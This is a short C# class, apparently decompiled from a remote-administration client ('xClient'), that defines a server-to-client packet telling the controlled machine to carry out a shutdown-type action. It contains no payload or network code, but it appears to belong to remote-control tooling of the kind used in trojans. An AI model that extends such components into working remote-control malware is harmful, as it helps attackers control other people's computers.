using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoShutdownAction : GInterface4
{
	public GEnum2 Action { get; set; }

	public DoShutdownAction()
	{
	}

	public DoShutdownAction(GEnum2 action)
	{
		Action = action;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
